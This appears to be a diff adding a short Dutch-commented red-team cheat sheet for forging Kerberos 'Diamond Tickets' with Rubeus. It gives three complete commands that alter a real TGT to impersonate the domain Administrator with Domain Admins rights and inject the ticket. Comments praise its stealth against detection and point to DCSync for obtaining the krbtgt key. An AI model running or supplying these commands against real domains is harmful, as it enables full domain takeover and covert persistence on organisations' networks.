@@ -1,0 +1,12 @@
+# Diamond Ticket - TGT modification (meer opsec dan Golden Ticket)
+# Verschil: Diamond modificeert een ECHT TGT, Golden maakt een nieuwe
+# Voordeel: Ticket heeft echte PAC, moeilijker te detecteren
+# Met user credentials:
+.\Rubeus.exe diamond /krbkey:KRBTGT_AES256_KEY /user:currentuser /password:Password123! /enctype:aes /ticketuser:Administrator /domain:domain.local /dc:dc01.domain.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+# Met TGT delegation (geen wachtwoord nodig, meer stealth):
+.\Rubeus.exe diamond /krbkey:KRBTGT_AES256_KEY /tgtdeleg /enctype:aes /ticketuser:Administrator /domain:domain.local /dc:dc01.domain.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+# Met NTLM hash in plaats van AES:
+.\Rubeus.exe diamond /krbkey:KRBTGT_AES256_KEY /user:currentuser /rc4:USER_NTLM_HASH /enctype:aes /ticketuser:Administrator /domain:domain.local /dc:dc01.domain.local /ticketuserid:500 /groups:512 /ptt
+# Tip: /ticketuserid:500 = RID van Administrator, /groups:512 = Domain Admins
+# Tip: Diamond Ticket = goudstandaard voor opsec bij ticket forgery
+# Tip: Vereist krbtgt AES key - verkrijg via DCSync
